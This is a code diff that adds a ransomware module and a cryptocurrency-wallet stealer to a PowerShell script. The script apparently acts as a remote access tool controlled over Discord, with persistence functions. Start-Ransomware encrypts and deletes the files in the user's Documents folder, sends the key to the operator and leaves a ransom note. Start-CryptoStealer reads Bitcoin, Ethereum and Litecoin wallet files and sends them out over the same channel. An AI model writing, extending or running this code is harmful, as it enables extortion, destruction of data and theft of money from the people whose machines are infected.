@@ -627,6 +627,62 @@ Function ScreenParty {
     sendMsg -Message ":white_check_mark: ``Screen Party Started!`` :white_check_mark:"  
 }
 
+# Ransomware Module - Encrypt Files on System
+function Start-Ransomware {
+    param($TargetDir = "$env:USERPROFILE\Documents")
+    $key = New-Object Byte[] 32
+    [Security.Cryptography.RNGCryptoServiceProvider]::Create().GetBytes($key)
+    $keyB64 = [Convert]::ToBase64String($key)
+    SendMsg "Ransomware activated. Encryption Key (save this for decryption): $keyB64"
+    
+    $files = Get-ChildItem -Path $TargetDir -Recurse -File | Where-Object { $_.Extension -notin @('.enc', '.exe', '.dll') }
+    foreach ($file in $files) {
+        try {
+            $aes = New-Object System.Security.Cryptography.AesManaged
+            $aes.Key = $key
+            $aes.IV = New-Object Byte[] 16
+            $encryptor = $aes.CreateEncryptor()
+            $fileContent = [System.IO.File]::ReadAllBytes($file.FullName)
+            $encrypted = $encryptor.TransformFinalBlock($fileContent, 0, $fileContent.Length)
+            [System.IO.File]::WriteAllBytes("$($file.FullName).enc", $encrypted)
+            Remove-Item $file.FullName -Force
+            SendMsg "Encrypted: $($file.Name)"
+        } catch {
+            SendMsg "Failed to encrypt $($file.Name): $_"
+        }
+    }
+    $ransomNote = "Your files have been encrypted. Contact us via this Discord channel for decryption. DO NOT DELETE THIS CHANNEL."
+    Set-Content -Path "$TargetDir\RANSOM_NOTE.txt" -Value $ransomNote
+    SendMsg "Ransomware complete. Ransom note placed in $TargetDir."
+}
+
+# Crypto Stealer Module - Steal Cryptocurrency Wallet Data
+function Start-CryptoStealer {
+    $wallets = @()
+    $walletPaths = @{
+        "Bitcoin" = "$env:APPDATA\Bitcoin\wallet.dat"
+        "Ethereum" = "$env:APPDATA\Ethereum\keystore"
+        "Litecoin" = "$env:APPDATA\Litecoin\wallet.dat"
+    }
+    foreach ($wallet in $walletPaths.GetEnumerator()) {
+        if (Test-Path $wallet.Value) {
+            try {
+                $walletData = Get-Content $wallet.Value -Raw -ErrorAction Stop
+                $wallets += "Found $($wallet.Key) wallet at $($wallet.Value)"
+                SendMsg "Stealing $($wallet.Key) wallet data..."
+                SendMsg "Wallet Data (Base64): $([Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($walletData)))"
+            } catch {
+                SendMsg "Failed to steal $($wallet.Key) data: $_"
+            }
+        }
+    }
+    if ($wallets.Count -eq 0) {
+        SendMsg "No cryptocurrency wallets found on this system."
+    } else {
+        SendMsg "Crypto steal complete. Found wallets: `n$($wallets -join "`n")"
+    }
+}
+
 # --------------------------------------------------------------- PERSISTANCE FUNCTIONS ------------------------------------------------------------------------
 
 Function AddPersistance{
@@ -2023,6 +2079,7 @@ while ($true) {
     }
     Sleep 3
 }
+
 
 
 
